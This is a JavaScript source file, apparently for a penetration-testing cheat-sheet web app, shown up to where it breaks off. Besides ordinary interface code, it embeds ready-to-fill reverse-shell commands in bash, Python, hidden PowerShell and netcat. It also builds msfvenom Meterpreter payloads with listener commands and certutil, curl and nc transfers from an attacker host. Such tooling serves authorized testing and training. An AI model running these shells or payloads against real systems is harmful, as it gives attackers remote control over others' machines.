let currentPhase = null;
let parameters = {};
let phases = {};
let currentContent = '';
let checkboxStates = new Map();
let filteredParameters = null;
let activeCodeBlock = null;
let activeCodeBlockIndex = null;
let codeBlockParamMap = [];
let outsideClickListenerAttached = false;
let suppressParamPanelRender = false;
let paramSearchTerm = '';
let resetToastTimeout = null;
let codeBlockWrappers = [];
let modalCopyWrappers = [];
let selectionCopyHandlerAttached = false;
let lastCopiedSelection = '';
let lastCopiedWrapper = null;
let lastCopiedAt = 0;

const CHECKBOX_STORAGE_KEY = 'checkboxStates';
const PARAMS_STORAGE_KEY = 'parameters';
const PARAM_TOKEN_REGEX = /(<[A-Z_0-9]+>|{{[A-Z_0-9]+}})/g;

// CONSTANTS CHANGED: Using %% delimiters and a safe separator to avoid Markdown collisions (tables/backticks)
const PARAM_MARKER_START = '%%PWN_START%%';
const PARAM_MARKER_END = '%%PWN_END%%';
// Use a separator without pipes to avoid Markdown table splitting inside inline code/backticks
const PARAM_SEPARATOR = '%%PVAL%%';
const PARAM_SEPARATOR_REGEX = escapeRegex(PARAM_SEPARATOR);

const OS_LABELS = {
    linux: 'Linux',
    windows: 'Windows',
    macos: 'macOS'
};

const OS_ICON_MAP = {
    linux: 'bi-ubuntu',
    windows: 'bi-windows',
    macos: 'bi-apple'
};

const TRANSFER_PROTOCOLS = [
    {
        name: 'HTTP',
        source: {
            linux: [{ label: 'Command', command: 'python3 -m http.server <LPORT>' }],
            macos: [{ label: 'Command', command: 'python3 -m http.server <LPORT>' }],
            windows: [
                { label: 'PowerShell', command: 'python -m http.server <LPORT>' },
                { label: 'CMD', command: 'py -3 -m http.server <LPORT>' }
            ]
        },
        destination: {
            linux: [{ label: 'Command', command: 'curl -o <FILENAME> http://<LHOST>:<LPORT>/<FILENAME>' }],
            macos: [{ label: 'Command', command: 'curl -o <FILENAME> http://<LHOST>:<LPORT>/<FILENAME>' }],
            windows: [
                { label: 'PowerShell', command: 'Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILENAME> -OutFile <FILENAME>' },
                { label: 'CMD', command: 'certutil -urlcache -f http://<LHOST>:<LPORT>/<FILENAME> <FILENAME>' }
            ]
        }
    },
    {
        name: 'SMB',
        source: {
            linux: [{ label: 'Command', command: 'impacket-smbserver share . -smb2support' }],
            macos: [{ label: 'Command', command: 'impacket-smbserver share . -smb2support' }],
            windows: [
                { label: 'PowerShell', command: 'New-SmbShare -Name share -Path C:\\share' },
                { label: 'CMD', command: 'net share share=C:\\share' }
            ]
        },
        destination: {
            linux: [{ label: 'Command', command: 'smbclient //<LHOST>/share -c "get <FILENAME>"' }],
            macos: [{ label: 'Command', command: 'smbclient //<LHOST>/share -c "get <FILENAME>"' }],
            windows: [
                { label: 'PowerShell', command: 'Copy-Item "\\\\<LHOST>\\share\\<FILENAME>" -Destination .' },
                { label: 'CMD', command: 'copy \\\\<LHOST>\\share\\<FILENAME> .\\<FILENAME>' }
            ]
        }
    },
    {
        name: 'SCP',
        source: {
            linux: [{ label: 'Command', command: 'scp <FILENAME> <USER>@<RHOST>:/tmp/<FILENAME>' }],
            macos: [{ label: 'Command', command: 'scp <FILENAME> <USER>@<RHOST>:/tmp/<FILENAME>' }],
            windows: [
                { label: 'PowerShell', command: 'scp <FILENAME> <USER>@<RHOST>:/tmp/<FILENAME>' },
                { label: 'CMD', command: 'scp <FILENAME> <USER>@<RHOST>:/tmp/<FILENAME>' }
            ]
        },
        destination: {
            linux: [{ label: 'Command', command: 'scp <USER>@<LHOST>:/tmp/<FILENAME> ./' }],
            macos: [{ label: 'Command', command: 'scp <USER>@<LHOST>:/tmp/<FILENAME> ./' }],
            windows: [
                { label: 'PowerShell', command: 'scp <USER>@<LHOST>:/tmp/<FILENAME> .\\' },
                { label: 'CMD', command: 'scp <USER>@<LHOST>:/tmp/<FILENAME> .\\' }
            ]
        }
    },
    {
        name: 'Netcat',
        source: {
            linux: [{ label: 'Command', command: 'nc -lvnp <LPORT> < <FILENAME>' }],
            macos: [{ label: 'Command', command: 'nc -lvnp <LPORT> < <FILENAME>' }],
            windows: [
                { label: 'PowerShell', command: 'ncat.exe -lvnp <LPORT> < <FILENAME>' },
                { label: 'CMD', command: 'ncat.exe -lvnp <LPORT> < <FILENAME>' }
            ]
        },
        destination: {
            linux: [{ label: 'Command', command: 'nc <LHOST> <LPORT> > <FILENAME>' }],
            macos: [{ label: 'Command', command: 'nc <LHOST> <LPORT> > <FILENAME>' }],
            windows: [
                { label: 'PowerShell', command: 'ncat.exe <LHOST> <LPORT> | Set-Content -Path <FILENAME>' },
                { label: 'CMD', command: 'ncat.exe <LHOST> <LPORT> > <FILENAME>' }
            ]
        }
    }
];

const REVERSE_SHELL_TEMPLATES = {
    bash: {
        label: 'Bash',
        attacker: 'nc -lvnp {{LPORT}}',
        victim: 'bash -c "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"'
    },
    python: {
        label: 'Python',
        attacker: 'nc -lvnp {{LPORT}}',
        victim: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    },
    powershell: {
        label: 'PowerShell',
        attacker: 'nc -lvnp {{LPORT}}',
        victim: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{{LHOST}}\',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
    },
    netcat: {
        label: 'Netcat (with -e)',
        attacker: 'nc -lvnp {{LPORT}}',
        victim: 'nc {{LHOST}} {{LPORT}} -e /bin/bash'
    }
};

const MSFVENOM_TEMPLATES = [
    {
        key: 'windows_meterpreter',
        label: 'Windows x64 Meterpreter (exe)',
        payload: 'windows/x64/meterpreter/reverse_tcp',
        format: 'exe',
        extension: 'exe',
        defaultName: 'payload'
    },
    {
        key: 'linux_x64',
        label: 'Linux x64 Shell (elf)',
        payload: 'linux/x64/shell_reverse_tcp',
        format: 'elf',
        extension: 'elf',
        defaultName: 'payload'
    },
    {
        key: 'linux_x86',
        label: 'Linux x86 Shell (elf)',
        payload: 'linux/x86/shell_reverse_tcp',
        format: 'elf',
        extension: 'elf',
        defaultName: 'payload'
    },
    {
        key: 'macos',
        label: 'macOS x64 Shell (macho)',
        payload: 'osx/x64/shell_reverse_tcp',
        format: 'macho',
        extension: 'macho',
        defaultName: 'payload'
    },
    {
        key: 'php',
        label: 'PHP Reverse TCP (raw)',
        payload: 'php/reverse_php',
        format: 'raw',
        extension: 'php',
        defaultName: 'payload'
    }
];

document.addEventListener('DOMContentLoaded', () => {
    injectStyles(); // Ensures green color is always loaded
    loadMarkdownFiles();
    setupEventListeners();
    setupMarkedOptions();
    updateResetButtonVisibility();
    
    // Smooth fade in
    document.body.style.opacity = '0';
    requestAnimationFrame(() => {
        document.body.style.transition = 'opacity 0.3s ease';
        document.body.style.opacity = '1';
    });
});

function escapeRegex(value) {
    return value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function escapeHtml(value) {
    return `${value}`
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// FIX: Force Green Styles with High Specificity
function injectStyles() {
    const styleId = 'pwn-dynamic-styles';
    if (!document.getElementById(styleId)) {
        const style = document.createElement('style');
        style.id = styleId;
        style.textContent = `
            /* Target the token specifically */
            span.param-token {
                color: rgb(0, 255, 30) !important; /* Bright Green */
                font-weight: bold;
                display: inline-block;
                text-shadow: 0 0 2px rgba(46, 204, 113, 0.2);
            }
            
            /* Ensure it overrides code block syntax highlighting */
            .code-block code span.param-token,
            pre code span.param-token {
                color: rgb(0, 255, 30) !important;
            }
        `;
        document.head.appendChild(style);
    }
}

function setupMarkedOptions() {
    const renderer = new marked.Renderer();
    const originalLinkRenderer = renderer.link;
    
    renderer.link = function(href, title, text) {
        const html = originalLinkRenderer.call(this, href, title, text);
        const isExternal = /^https?:\/\//i.test(href);
        if (!isExternal) {
            return html;
        }
        return html.replace(/^<a /, '<a target="_blank" rel="noopener noreferrer" ');
    };
    
    marked.setOptions({
        renderer: renderer,
        breaks: true,
        gfm: true
    });
}

function setupEventListeners() {
    document.getElementById('togglePanelBtn').addEventListener('click', toggleRightPanel);

    const scrollTopBtn = document.getElementById('scrollTopBtn');
    const contentArea = document.getElementById('contentArea');
    
    contentArea.addEventListener('scroll', () => {
        if (contentArea.scrollTop > 300) {
            scrollTopBtn.classList.add('visible');
        } else {
            scrollTopBtn.classList.remove('visible');
        }
    });

    scrollTopBtn.addEventListener('click', () => {
        contentArea.scrollTo({ top: 0, behavior: 'smooth' });
    });

    const newAssessmentBtn = document.getElementById('newAssessmentBtn');
    if (newAssessmentBtn) {
        newAssessmentBtn.addEventListener('click', resetAssessment);
    }

    const downloadKitBtn = document.getElementById('downloadKitBtn');
    const skeletonMenu = document.getElementById('skeletonMenu');

    if (downloadKitBtn && skeletonMenu) {
        downloadKitBtn.addEventListener('click', (e) => {
            e.stopPropagation();
            skeletonMenu.classList.toggle('show');
        });

        skeletonMenu.querySelectorAll('.skeleton-option').forEach((option) => {
            option.addEventListener('click', (e) => {
                e.stopPropagation();
                const templateType = option.dataset.template || 'empty';
                skeletonMenu.classList.remove('show');
                downloadSkeletonZip(templateType);
            });
        });

        document.addEventListener('click', (e) => {
            if (!skeletonMenu.contains(e.target) && !downloadKitBtn.contains(e.target)) {
                skeletonMenu.classList.remove('show');
            }
        });
    }

    document.addEventListener('keydown', (e) => {
        if ((e.ctrlKey || e.metaKey) && e.key === 'r') {
            e.preventDefault();
            resetAssessment();
        }
    });

    setupModalTriggers();
    setupTabs();
    setupTransferModal();
    setupReverseShellModal();
    setupToolsTable();
}

function setupModalTriggers() {
    const modalPairs = [
        { buttonId: 'fileTransferBtn', modalId: 'fileTransferModal' },
        { buttonId: 'reverseShellBtn', modalId: 'reverseShellModal' },
        { buttonId: 'toolsBtn', modalId: 'toolsModal' }
    ];

    modalPairs.forEach(({ buttonId, modalId }) => {
        const button = document.getElementById(buttonId);
        const modal = document.getElementById(modalId);

        if (!button || !modal) {
            return;
        }

        button.addEventListener('click', () => openModal(modal));
    });

    document.querySelectorAll('.pwn-modal').forEach(modal => {
        modal.addEventListener('click', (event) => {
            if (event.target.closest('[data-close-modal]')) {
                closeModal(modal);
            }
        });
    });

    document.addEventListener('keydown', (event) => {
        if (event.key === 'Escape') {
            closeAllModals();
        }
    });
}

function setupTabs() {
    document.querySelectorAll('.modal-tabs').forEach(tabGroup => {
        const buttons = Array.from(tabGroup.querySelectorAll('[data-tab-target]'));
        if (!buttons.length) {
            return;
        }

        const container = tabGroup.closest('.pwn-modal-body') || tabGroup.parentElement;
        const panels = Array.from(container.querySelectorAll('.tab-panel'));

        const activate = (target) => {
            buttons.forEach(button => {
                button.classList.toggle('active', button.dataset.tabTarget === target);
            });

            panels.forEach(panel => {
                panel.classList.toggle('active', panel.dataset.tabPanel === target);
            });
        };

        buttons.forEach(button => {
            button.addEventListener('click', () => activate(button.dataset.tabTarget));
        });

        const activeButton = buttons.find(button => button.classList.contains('active')) || buttons[0];
        activate(activeButton.dataset.tabTarget);
    });
}

function openModal(modal) {
    if (!modal) {
        return;
    }

    closeAllModals();
    modal.classList.add('show');
    modal.setAttribute('aria-hidden', 'false');
    document.body.classList.add('modal-open');

    const focusTarget = modal.querySelector('input, select, button');
    if (focusTarget) {
        focusTarget.focus();
    }
}

function closeModal(modal) {
    if (!modal) {
        return;
    }

    modal.classList.remove('show');
    modal.setAttribute('aria-hidden', 'true');

    if (!document.querySelector('.pwn-modal.show')) {
        document.body.classList.remove('modal-open');
    }
}

function closeAllModals() {
    document.querySelectorAll('.pwn-modal.show').forEach(modal => closeModal(modal));
}

function setupTransferModal() {
    const fromSelect = document.getElementById('transferFrom');
    const toSelect = document.getElementById('transferTo');
    const lhostInput = document.getElementById('transferLhost');
    const lportInput = document.getElementById('transferLport');
    const filenameInput = document.getElementById('transferFilename');
    const swapBtn = document.getElementById('transferSwapBtn');

    if (!fromSelect || !toSelect || !lhostInput || !lportInput || !filenameInput || !swapBtn) {
        return;
    }

    prefillTransferInputs(lhostInput, lportInput, filenameInput);

    const update = () => {
        const fromOs = fromSelect.value;
        const toOs = toSelect.value;
        const { lhost, lport, filename } = getTransferInputValues(lhostInput, lportInput, filenameInput);
        updateTransferVisual(fromOs, toOs);
        renderTransferTable(fromOs, toOs, { lhost, lport, filename });
    };
    fromSelect.addEventListener('change', update);
    toSelect.addEventListener('change', update);
    lhostInput.addEventListener('input', update);
    lportInput.addEventListener('input', update);
    filenameInput.addEventListener('input', update);
    swapBtn.addEventListener('click', () => {
        const temp = fromSelect.value;
        fromSelect.value = toSelect.value;
        toSelect.value = temp;
        update();
    });
    update();
}

function updateTransferVisual(fromOs, toOs) {
    const fromIcon = document.getElementById('transferFromIcon');
    const toIcon = document.getElementById('transferToIcon');
    const visual = document.getElementById('transferVisual');

    if (!fromIcon || !toIcon || !visual) {
        return;
    }

    fromIcon.className = `bi ${OS_ICON_MAP[fromOs] || 'bi-terminal'}`;
    toIcon.className = `bi ${OS_ICON_MAP[toOs] || 'bi-terminal'}`;

    visual.classList.remove('transfer-animate');
    void visual.offsetWidth;
    visual.classList.add('transfer-animate');
}

function renderTransferTable(fromOs, toOs, params) {
    const tbody = document.getElementById('transferTableBody');
    if (!tbody) {
        return;
    }

    tbody.innerHTML = '';
    const replacements = [
        { placeholder: '<LHOST>', value: params?.lhost || '' },
        { placeholder: '<LPORT>', value: params?.lport || '' },
        { placeholder: '<FILENAME>', value: params?.filename || '' },
        { placeholder: '<RHOST>', value: '' },
        { placeholder: '<USER>', value: '' }
    ];

    TRANSFER_PROTOCOLS.forEach(protocol => {
        const row = document.createElement('tr');

        const protocolCell = document.createElement('td');
        protocolCell.textContent = protocol.name;

        const attackerCell = buildTransferCommandCell(protocol.source[fromOs], replacements);
        const victimCell = buildTransferCommandCell(protocol.destination[toOs], replacements);

        row.appendChild(protocolCell);
        row.appendChild(attackerCell);
        row.appendChild(victimCell);
        tbody.appendChild(row);
    });
}

function buildTransferCommandCell(commands, replacements) {
    const cell = document.createElement('td');

    if (!commands || commands.length === 0) {
        cell.textContent = 'No commands available for this OS.';
        return cell;
    }

    commands.forEach(item => {
        const entry = document.createElement('div');
        entry.className = 'transfer-command';

        const labelSpan = document.createElement('span');
        labelSpan.className = 'command-label';
        labelSpan.textContent = item.label;

        const code = document.createElement('code');
        code.innerHTML = formatTemplateWithHighlights(item.command, replacements);

        entry.appendChild(labelSpan);
        entry.appendChild(code);
        cell.appendChild(entry);
    });

    return cell;
}

function setupReverseShellModal() {
    const lhostInput = document.getElementById('reverseLhost');
    const lportInput = document.getElementById('reverseLport');
    const typeSelect = document.getElementById('reverseType');

    if (!lhostInput || !lportInput || !typeSelect) {
        return;
    }

    populateReverseShellOptions(typeSelect);
    prefillReverseShellInputs(lhostInput, lportInput);
    setupModalCopyZones();

    const update = () => renderReverseShellCommands();
    setupMsfvenomSection(update);
    lhostInput.addEventListener('input', update);
    lportInput.addEventListener('input', update);
    typeSelect.addEventListener('change', update);
    update();
}

function populateReverseShellOptions(select) {
    const order = ['bash', 'python', 'powershell', 'netcat'];
    select.innerHTML = '';

    order.forEach(key => {
        if (!REVERSE_SHELL_TEMPLATES[key]) {
            return;
        }
        const option = document.createElement('option');
        option.value = key;
        option.textContent = REVERSE_SHELL_TEMPLATES[key].label;
        select.appendChild(option);
    });
}

function renderReverseShellCommands() {
    const lhostInput = document.getElementById('reverseLhost');
    const lportInput = document.getElementById('reverseLport');
    const typeSelect = document.getElementById('reverseType');
    const attackerOutput = document.getElementById('reverseAttackerCmd');
    const victimOutput = document.getElementById('reverseVictimCmd');
    const lhostError = document.getElementById('reverseLhostError');
    const lportError = document.getElementById('reverseLportError');

    if (!lhostInput || !lportInput || !typeSelect || !attackerOutput || !victimOutput) {
        return;
    }

    const { lhost, lport, lhostValid, lportValid } = validateReverseShellInputs(
        lhostInput,
        lportInput,
        lhostError,
        lportError
    );

    if (!lhostValid || !lportValid) {
        const message = 'Enter a valid LHOST and LPORT to generate commands.';
        attackerOutput.textContent = message;
        victimOutput.textContent = message;
        renderMsfvenomCommands(null, null);
        return;
    }

    const selected = REVERSE_SHELL_TEMPLATES[typeSelect.value] || REVERSE_SHELL_TEMPLATES.bash;
    const replacements = [
        { placeholder: '{{LHOST}}', value: lhost },
        { placeholder: '{{LPORT}}', value: lport }
    ];
    attackerOutput.innerHTML = formatTemplateWithHighlights(selected.attacker, replacements);
    victimOutput.innerHTML = formatTemplateWithHighlights(selected.victim, replacements);
    renderMsfvenomCommands(lhost, lport);
}

function prefillReverseShellInputs(lhostInput, lportInput) {
    const storedLhost = getStoredParamValue('LHOST');
    const storedLport = getStoredParamValue('LPORT');

    if (storedLhost) {
        lhostInput.value = storedLhost;
    } else if (!lhostInput.value) {
        lhostInput.value = '10.10.14.8';
    }

    if (storedLport) {
        lportInput.value = storedLport;
    } else if (!lportInput.value) {
        lportInput.value = '4444';
    }
}

function getStoredParamValue(paramNames) {
    const stored = getStoredParameters();
    const names = Array.isArray(paramNames) ? paramNames : [paramNames];

    for (const name of names) {
        if (!name) {
            continue;
        }

        const direct = stored[name];
        if (direct !== undefined && `${direct}`.trim() !== '') {
            return `${direct}`.trim();
        }

        const lower = stored[name.toLowerCase()];
        if (lower !== undefined && `${lower}`.trim() !== '') {
            return `${lower}`.trim();
        }
    }

    return '';
}

function prefillTransferInputs(lhostInput, lportInput, filenameInput) {
    const storedLhost = getStoredParamValue('LHOST');
    const storedLport = getStoredParamValue('LPORT');
    const storedFilename = getStoredParamValue(['FILENAME', 'FILE']);

    if (storedLhost) {
        lhostInput.value = storedLhost;
    }

    if (storedLport) {
        lportInput.value = storedLport;
    }

    if (storedFilename) {
        filenameInput.value = storedFilename;
    }
}

function getTransferInputValues(lhostInput, lportInput, filenameInput) {
    return {
        lhost: (lhostInput.value || '').trim(),
        lport: (lportInput.value || '').trim(),
        filename: (filenameInput.value || '').trim()
    };
}

function formatTemplateWithHighlights(template, replacements) {
    let html = escapeHtml(template);

    (replacements || []).forEach(item => {
        if (!item || !item.placeholder) {
            return;
        }

        const placeholder = escapeHtml(item.placeholder);
        const displayValue = item.value ? item.value : item.placeholder;
        const replacement = `<span class="param-token">${escapeHtml(displayValue)}</span>`;

        html = html.replace(new RegExp(escapeRegex(placeholder), 'g'), replacement);
    });

    return html;
}

function normalizeOutputName(value) {
    const trimmed = (value || '').trim();
    if (!trimmed) {
        return '';
    }

    const name = trimmed.split(/[\\/]/).pop();
    return name.replace(/\.[^/.]+$/, '');
}

function buildOutputFileName(baseName, extension) {
    if (!baseName) {
        return '';
    }
    if (!extension) {
        return baseName;
    }
    return `${baseName}.${extension}`;
}

function validateReverseShellInputs(lhostInput, lportInput, lhostError, lportError) {
    const lhost = lhostInput.value.trim();
    const lport = lportInput.value.trim();
    const lhostValid = isValidIp(lhost);
    const lportValid = isValidPort(lport);

    setFieldError(lhostInput, lhostError, lhostValid ? '' : 'Enter a valid IPv4 address.');
    setFieldError(lportInput, lportError, lportValid ? '' : 'Port must be 1-65535.');

    return { lhost, lport, lhostValid, lportValid };
}

function setFieldError(input, errorEl, message) {
    if (!input) {
        return;
    }

    if (message) {
        input.classList.add('invalid');
        input.setAttribute('aria-invalid', 'true');
    } else {
        input.classList.remove('invalid');
        input.removeAttribute('aria-invalid');
    }

    if (errorEl) {
        errorEl.textContent = message || '';
    }
}

function isValidIp(value) {
    const parts = value.split('.');
    if (parts.length !== 4) {
        return false;
    }

    return parts.every(part => {
        if (!/^\d+$/.test(part)) {
            return false;
        }
        const num = Number(part);
        return num >= 0 && num <= 255;
    });
}

function isValidPort(value) {
    if (!/^\d+$/.test(value)) {
        return false;
    }
    const port = Number(value);
    return Number.isInteger(port) && port >= 1 && port <= 65535;
}

function setupMsfvenomSection(onChange) {
    const payloadSelect = document.getElementById('msfvenomPayload');
    const outputInput = document.getElementById('msfvenomOutput');

    if (!payloadSelect || !outputInput) {
        return;
    }

    payloadSelect.innerHTML = '';
    MSFVENOM_TEMPLATES.forEach(template => {
        const option = document.createElement('option');
        option.value = template.key;
        option.textContent = template.label;
        payloadSelect.appendChild(option);
    });

    const defaultTemplate = MSFVENOM_TEMPLATES[0];
    if (defaultTemplate && !outputInput.value) {
        outputInput.value = defaultTemplate.defaultName;
    }
    outputInput.dataset.edited = outputInput.value ? 'true' : 'false';

    payloadSelect.addEventListener('change', () => {
        const selected = getSelectedMsfvenomTemplate(payloadSelect.value);
        if (selected && outputInput.dataset.edited !== 'true') {
            outputInput.value = selected.defaultName;
        }
        if (typeof onChange === 'function') {
            onChange();
        }
    });

    outputInput.addEventListener('input', () => {
        outputInput.dataset.edited = outputInput.value ? 'true' : 'false';
        if (typeof onChange === 'function') {
            onChange();
        }
    });
}

function getSelectedMsfvenomTemplate(selectedKey) {
    return MSFVENOM_TEMPLATES.find(template => template.key === selectedKey) || MSFVENOM_TEMPLATES[0];
}

function renderMsfvenomCommands(lhost, lport) {
    const payloadSelect = document.getElementById('msfvenomPayload');
    const outputInput = document.getElementById('msfvenomOutput');
    const msfvenomOutput = document.getElementById('msfvenomCmd');
    const listenerOutput = document.getElementById('msfvenomListenerCmd');

    if (!payloadSelect || !outputInput || !msfvenomOutput || !listenerOutput) {
        return;
    }

    if (!lhost || !lport) {
        const message = 'Enter a valid LHOST and LPORT to generate payloads.';
        msfvenomOutput.textContent = message;
        listenerOutput.textContent = message;
        return;
    }

    const selected = getSelectedMsfvenomTemplate(payloadSelect.value);
    const baseName = normalizeOutputName(outputInput.value) || selected.defaultName;
    const outputFile = buildOutputFileName(baseName, selected.extension);

    const payload = selected.payload;
    const format = selected.format;
    const replacements = [
        { placeholder: '{{LHOST}}', value: lhost },
        { placeholder: '{{LPORT}}', value: lport },
        { placeholder: '{{OUTPUT}}', value: outputFile }
    ];

    const msfvenomTemplate = `msfvenom -p ${payload} LHOST={{LHOST}} LPORT={{LPORT}} -f ${format} -o {{OUTPUT}}`;
    const listenerTemplate = `msfconsole -q -x "use exploit/multi/handler; set payload ${payload}; set LHOST {{LHOST}}; set LPORT {{LPORT}}; run -j"`;

    msfvenomOutput.innerHTML = formatTemplateWithHighlights(msfvenomTemplate, replacements);
    listenerOutput.innerHTML = formatTemplateWithHighlights(listenerTemplate, replacements);
}

function setupModalCopyZones() {
    const zones = document.querySelectorAll('[data-copy-zone]');
    modalCopyWrappers = [];

    zones.forEach(zone => addModalCopyBehavior(zone));
    attachSelectionCopyHandler();
}

function setupToolsTable() {
    setupFilterableTable({
        tableId: 'toolsTable',
        searchInputId: 'toolsSearch',
        sortGroup: 'tools',
        columns: [
            { key: 'name', index: 0 },
            { key: 'category', index: 1 },
            { key: 'executable', index: 2 },
            { key: 'linkHtml', index: 3, html: true }
        ],
        searchKeys: ['name', 'category'],
        emptyMessage: 'No tools match your search.'
    });

    setupFilterableTable({
        tableId: 'wordlistsTable',
        searchInputId: 'wordlistsSearch',
        sortGroup: 'wordlists',
        columns: [
            { key: 'name', index: 0 },
            { key: 'category', index: 1 },
            { key: 'commandHtml', index: 2, html: true }
        ],
        searchKeys: ['name', 'category', 'commandHtml'],
        emptyMessage: 'No wordlists match your search.'
    });
}

function setupFilterableTable(config) {
    const table = document.getElementById(config.tableId);
    const searchInput = document.getElementById(config.searchInputId);
    const sortButtons = document.querySelectorAll(`[data-sort-group="${config.sortGroup}"]`);

    if (!table || !searchInput || !sortButtons.length) {
        return;
    }

    const tbody = table.querySelector('tbody');
    if (!tbody) {
        return;
    }

    const rowsData = Array.from(tbody.querySelectorAll('tr')).map(row => {
        const cells = row.querySelectorAll('td');
        const record = {};
        config.columns.forEach(column => {
            const cell = cells[column.index];
            if (!cell) {
                record[column.key] = '';
                return;
            }
            record[column.key] = column.html ? cell.innerHTML.trim() : cell.textContent.trim();
        });
        return record;
    });

    const state = {
        sortKey: config.columns[0]?.key || 'name'
    };

    const render = () => {
        const term = searchInput.value.trim().toLowerCase();
        const filtered = rowsData.filter(row => {
            if (!term) {
                return true;
            }

            return config.searchKeys.some(key => (row[key] || '').toLowerCase().includes(term));
        });

        const sorted = filtered.sort((a, b) => {
            return (a[state.sortKey] || '').localeCompare(b[state.sortKey] || '');
        });

        tbody.innerHTML = '';

        if (!sorted.length) {
            const emptyRow = document.createElement('tr');
            const emptyCell = document.createElement('td');
            emptyCell.colSpan = config.columns.length;
            emptyCell.className = 'tools-empty';
            emptyCell.textContent = config.emptyMessage || 'No results found.';
            emptyRow.appendChild(emptyCell);
            tbody.appendChild(emptyRow);
            return;
        }

        sorted.forEach(rowData => {
            const row = document.createElement('tr');
            config.columns.forEach(column => {
                const cell = document.createElement('td');
                if (column.html) {
                    cell.innerHTML = rowData[column.key] || '';
                } else {
                    cell.textContent = rowData[column.key] || '';
                }
                row.appendChild(cell);
            });
            tbody.appendChild(row);
        });
    };

    sortButtons.forEach(button => {
        button.addEventListener('click', () => {
            state.sortKey = button.dataset.sortKey || state.sortKey;
            sortButtons.forEach(btn => btn.classList.remove('active'));
            button.classList.add('active');
            render();
        });
    });

    sortButtons[0].classList.add('active');
    searchInput.addEventListener('input', render);
    render();
}

async function downloadSkeletonZip(templateType = 'empty') {
    const downloadBtn = document.getElementById('downloadKitBtn');
    if (!downloadBtn || typeof JSZip === 'undefined') {
        console.error('JSZip is not available; cannot build the notes kit.');
        return;
    }

    const originalLabel = downloadBtn.innerHTML;
    downloadBtn.disabled = true;
    downloadBtn.innerHTML = '<i class="bi bi-hourglass-split" aria-hidden="true"></i><span>Building kit...</span>';

    try {
        const zip = new JSZip();
        const basePath = 'pwnsheet-skeleton/';
        const skeletonFiles = await buildNotesSkeleton(templateType);

        if (!skeletonFiles || Object.keys(skeletonFiles).length === 0) {
            throw new Error('No skeleton files loaded for template: ' + templateType);
        }

        Object.entries(skeletonFiles).forEach(([path, content]) => {
            const normalizedContent = content.startsWith('\n') ? content.slice(1) : content;
            zip.file(basePath + path, normalizedContent);
        });

        const blob = await zip.generateAsync({ type: 'blob' });
        const downloadLink = document.createElement('a');
        downloadLink.href = URL.createObjectURL(blob);
        downloadLink.download = `pwnsheet-skeleton-${templateType}.zip`;
        document.body.appendChild(downloadLink);
        downloadLink.click();
        document.body.removeChild(downloadLink);
        setTimeout(() => URL.revokeObjectURL(downloadLink.href), 1200);
    } catch (error) {
        console.error('Failed to build the notes kit zip', error);
    } finally {
        downloadBtn.disabled = false;
        downloadBtn.innerHTML = originalLabel;
    }
}

async function buildNotesSkeleton(templateType = 'empty') {
    const templateDir = `skeleton/${templateType}`;
    const manifestUrl = `${templateDir}/manifest.json`;

    try {
        const manifestResponse = await fetch(manifestUrl);
        if (!manifestResponse.ok) {
            throw new Error(`Manifest not found for template: ${templateType}`);
        }

        const manifest = await manifestResponse.json();

        const fileEntries = await Promise.all(manifest.map(async (relativePath) => {
            const fileResponse = await fetch(`${templateDir}/${relativePath}`);
            if (!fileResponse.ok) {
                throw new Error(`Failed to load skeleton file: ${relativePath}`);
            }

            const content = await fileResponse.text();
            return [relativePath, content];
        }));

        return Object.fromEntries(fileEntries);
    } catch (error) {
        console.error('Failed to load skeleton templates:', error);
        return {};
    }
}

async function loadMarkdownFiles() {
    const mdFiles = [
        '01 - Reconnaissance & Enumeration.md',
        '02 - Vulnerability Research & Exploitation.md',
        '03 - Post Exploitation & Privilege Escalation.md',
        '04 - Lateral Movement.md',
        '05 - Active Directory Exploitation.md',
    ];

    const phaseList = document.getElementById('phaseList');
    phaseList.innerHTML = '';

    let loadedCount = 0;

    for (let i = 0; i < mdFiles.length; i++) {
        const filename = "notes/"+mdFiles[i];
        
        try {
            const response = await fetch(filename);
            if (response.ok) {
                const content = await response.text();
                phases[filename] = content;
                loadedCount++;
                
                const btn = document.createElement('button');
                btn.className = 'phase-btn';
                if (i === 0) {
                    btn.classList.add('active');
                    currentPhase = filename;
                }
                btn.dataset.phase = filename;
                btn.textContent = filename.replace('notes/','').replace('.md', '');
                btn.setAttribute('aria-label', `Load phase: ${filename.replace('.md', '')}`);
                
                btn.addEventListener('click', (e) => {
                    document.querySelectorAll('.phase-btn').forEach(b => b.classList.remove('active'));
                    e.target.classList.add('active');
                    currentPhase = e.target.dataset.phase;
                    checkboxStates.clear();
                    loadPhase(currentPhase);
                });
                
                phaseList.appendChild(btn);
            }
        } catch (error) {
            console.error(`Error loading ${filename}:`, error);
        }
    }

    if (loadedCount === 0) {
        phaseList.innerHTML = '<div class="loading-text">⚠️ No markdown files found.</div>';
        return;
    }

    if (currentPhase && phases[currentPhase]) {
        loadPhase(currentPhase);
    } else if (Object.keys(phases).length > 0) {
        currentPhase = Object.keys(phases)[0];
        loadPhase(currentPhase);
    }
}

function loadPhase(phase) {
    const content = phases[phase] || '';
    currentContent = content;
    checkboxStates.clear();
    clearCodeBlockSelection(true);
    paramSearchTerm = '';

    const matches = content.matchAll(/\[([ xX])\]/g);
    let index = 0;
    for (const match of matches) {
        checkboxStates.set(index, match[1].toLowerCase() === 'x');
        index++;
    }

    const storedStates = loadCheckboxStatesFromStorage(phase);
    if (storedStates) {
